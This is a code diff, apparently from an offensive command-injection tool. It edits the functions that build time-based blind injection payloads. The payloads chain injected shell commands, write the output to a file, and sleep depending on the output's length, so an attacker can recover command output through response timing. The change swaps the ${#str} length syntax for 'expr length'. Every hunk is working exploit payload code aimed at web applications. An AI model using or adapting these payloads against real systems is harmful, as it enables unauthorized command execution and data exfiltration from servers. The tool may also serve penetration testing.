@@ -58,7 +58,8 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ")" + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
-                "str1=${#str}" + separator +
+                "str1=$(expr length \"$str\")" + separator +
+                #"str1=${%23str}" + separator +
                 "if [ " + str(j) + " -ne ${str1} ]" + separator +
                 "then sleep 0" + separator +
                 "else sleep " + str(timesec) + separator +
@@ -71,7 +72,8 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ")" + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
-                "str1=${#str}" + separator +
+                "str1=$(expr length \"$str\")" + separator +
+                #"str1=${%23str}" + separator +
                 "if [ " + str(j) + " -ne ${str1} ]" + separator +
                 "then sleep 0" + separator +
                 "else sleep " + str(timesec) + separator +
@@ -88,7 +90,8 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 "sleep 0" + separator +
                 "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ")" + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
-                "str1=${#str} " + separator +
+                "str1=$(expr length \"$str\")" + separator +
+                #"str1=${%23str} " + separator +
                 "[ " + str(j) + " -eq ${str1} ] " + separator +
                 "sleep " + str(timesec)
                 )
@@ -253,7 +256,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "echo $str > " + OUTPUT_TEXTFILE + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
-                "str1=${#str}" + separator +
+                "str1=$(expr length \"$str\")" + separator +
+                #"str1=${%23str}" + separator +
                 "if [ " + str(j) + " != ${str1} ]" + separator +
                 "then sleep 0 " + separator +
                 "else sleep " + str(timesec) + separator +
@@ -270,7 +274,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "echo $str > " + OUTPUT_TEXTFILE + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
-                "str1=${#str}" + separator +
+                "str1=$(expr length \"$str\")" + separator +
+                #"str1=${%23str}" + separator +
                 "if [ " + str(j) + " != ${str1} ]" + separator +
                 "then sleep 0 " + separator +
                 "else sleep " + str(timesec) + separator +
@@ -292,7 +297,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "echo $str >" + OUTPUT_TEXTFILE + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
-                "str1=${#str}" + separator +
+                "str1=$(expr length \"$str\")" + separator +
+                #"str1=${%23str}" + separator +
                 "[ " + str(j) + " -eq ${str1} ]" + separator +
                 "sleep " + str(timesec) + separator +
                 # Transform to ASCII
